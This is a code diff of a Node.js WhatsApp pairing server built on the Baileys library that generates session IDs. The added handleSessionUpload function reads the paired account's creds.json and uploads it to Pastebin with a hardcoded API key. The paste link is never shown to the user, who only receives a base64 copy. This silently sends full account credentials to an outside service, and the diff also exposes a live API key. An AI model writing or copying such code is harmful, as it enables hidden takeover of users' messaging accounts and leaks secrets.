@@ -1,104 +1,142 @@
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
-const pino = require('pino');
-const NodeCache = require('node-cache');
-const { Mutex } = require('async-mutex');
-const crypto = require('crypto');
-const { saveCreds } = require('./mongo');
+const express = require("express");
+const fs = require("fs-extra");
+const pino = require("pino");
+const NodeCache = require("node-cache");
+const { Mutex } = require("async-mutex");
+const PastebinAPI = require("pastebin-js");
+const path = require("path");
 const {
     default: makeWASocket,
     useMultiFileAuthState,
     delay,
     Browsers,
     makeCacheableSignalKeyStore,
-    DisconnectReason
-} = require('@whiskeysockets/baileys');
+    DisconnectReason,
+} = require("@whiskeysockets/baileys");
+
+const pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");
 const app = express();
-const port = 3000;
-let session;
+const port = process.env.PORT || 3000;
 const msgRetryCounterCache = new NodeCache();
 const mutex = new Mutex();
-const logger = pino({ level: 'silent' });
-const childLogger = logger.child({ level: 'silent', name: 'XAstral' });
+const logger = pino({ level: "info" });
+
+const cleanSessionDir = async () => {
+    const sessionDir = path.join(__dirname, "session");
+    if (fs.existsSync(sessionDir)) {
+        await fs.emptyDir(sessionDir);
+        await fs.remove(sessionDir);
+    }
+};
+
 app.use(express.static(path.join(__dirname, 'pages')));
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'pages', 'dashboard.html'));
 });
-
-async function connector(Num, res) {
-    const sessionId = `Naxor~${crypto.randomBytes(8).toString('hex')}`;
-    const { state, saveCreds } = await useMultiFileAuthState(
-        "./mongo",
-        childLogger
-    );
-    session = makeWASocket({
-        auth: {
-            creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, childLogger)
-        },
-        printQRInTerminal: false,
-        logger: childLogger,
-        browser: Browsers.macOS("Safari"),
-        markOnlineOnConnect: true,
-        msgRetryCounterCache
-    });
-    if (!session.authState.creds.registered) {
-        await delay(1500);
-        Num = Num.replace(/[^0-9]/g, '');
-        const code = await session.requestPairingCode(Num);
-        if (!res.headersSent) {
-            res.send({ code: code?.match(/.{1,4}/g)?.join('-') });
-        }
-    }
-
-    session.ev.on('creds.update', async () => {
-        await saveCreds();
-    });
-    session.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect } = update;
-        if (connection === 'open') {
-            childLogger.info('Connected successfully');
-            await delay(5000);
-            await session.sendMessage(session.user.id, { text: "*X Astral*:\nDont share_ur_session ID" });
-            childLogger.info('[Session] Session online');
-            await session.sendMessage(session.user.id, { text: `${sessionId}` });
-        } else if (connection === 'close') {
-            const reason = lastDisconnect?.error?.output?.statusCode;
-            childLogger.error(`Connection closed. Reason: ${reason}`);
-            reconn(reason);
-        }
-    });
-}
-
-function reconn(reason) {
-    if ([DisconnectReason.connectionLost, DisconnectReason.connectionClosed, DisconnectReason.restartRequired].includes(reason)) {
-        childLogger.warn('Connection lost, reconnecting...');
-        connector();
-    } else {
-        childLogger.error(`Disconnected! Reason: ${reason}`);
-        session.end();
-    }
-}
-
-app.get('/pair', async (req, res) => {
+    
+app.get("/pair", async (req, res) => {
     const Num = req.query.code;
     if (!Num) {
-        return res.status(418).json({ message: 'Phone number is required' });
+        return res.status(400).json({ message: "Phone number is required" });
     }
     const release = await mutex.acquire();
     try {
+        await cleanSessionDir();
         await connector(Num, res);
     } catch (error) {
-        childLogger.error(error);
-        res.status(500).json({ error: 'Server Error' });
+        logger.error("Error during pairing process:", error);
+        res.status(500).json({ error: "Server Error" });
+        await cleanSessionDir();
     } finally {
         release();
     }
 });
 
-app.listen(port, () => {
-    childLogger.info(`PORT: ${port}`);
-});
+async function connector(Num, res) {
+    const sessionDir = path.join(__dirname, "session");
+    await fs.ensureDir(sessionDir);
+    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+    const session = makeWASocket({
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, logger),
+        },
+        printQRInTerminal: false,
+        logger,
+        browser: Browsers.macOS("Safari"),
+        markOnlineOnConnect: true,
+        msgRetryCounterCache,
+    });
 
+    if (!session.authState.creds.registered) {
+        await delay(1500);
+        Num = Num.replace(/[^0-9]/g, "");
+        const code = await session.requestPairingCode(Num);
+        if (!res.headersSent) {
+            res.json({ code: code?.match(/.{1,4}/g)?.join("-") });
+        }
+    }
+    session.ev.on("creds.update", async () => {
+        await saveCreds();
+    });
+    session.ev.on("connection.update", async (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === "open") {
+            logger.info("Connected successfully");
+            await delay(5000);
+            await handleSessionUpload(session);
+        } else if (connection === "close") {
+            const reason = lastDisconnect?.error?.output?.statusCode;
+            logger.warn(`Connection closed. Reason: ${reason}`);
+            reconn(reason, session, res);  // Pass session to reconn
+        }
+    });
+}
+
+async function handleSessionUpload(session) {
+    try {
+        const sessionFilePath = path.join(__dirname, "session", "creds.json");
+        const data = await fs.readFileSync(sessionFilePath, 'utf-8');
+        const textt = Buffer.from(data, 'utf-8').toString('base64');
+        const pasteData = await pastebin.createPasteFromFile(
+            sessionFilePath,
+            "naxordev",
+            null,
+            1,
+            "N",
+        );
+        const unique = pasteData.split("/")[3];
+        const sessionKey = Buffer.from(unique).toString("base64");
+        await session.sendMessage(session.user.id, {
+            text: "Naxor~" + textt,
+        });
+        await session.sendMessage(session.user.id, {
+            text: "X-Astrl don't share your session",
+        });
+        logger.info("[Session] Session online");
+        await cleanSessionDir();
+    } catch (error) {
+        logger.error("Error in handleSessionUpload:", error);
+    }
+}
+
+function reconn(reason, session, res) {
+    if (
+        [
+            DisconnectReason.connectionLost,
+            DisconnectReason.connectionClosed,
+            DisconnectReason.restartRequired,
+        ].includes(reason)
+    ) {
+        logger.info("Connection lost, reconnecting...");
+        connector(session.user.id, res);  // Pass session user ID and response object
+    } else {
+        logger.error(`Disconnected! Reason: ${reason}`);
+        session.end();
+    }
+}
+
+app.listen(port, () => {
+    logger.info(`Server running on http://localhost:${port}`);
+});
     
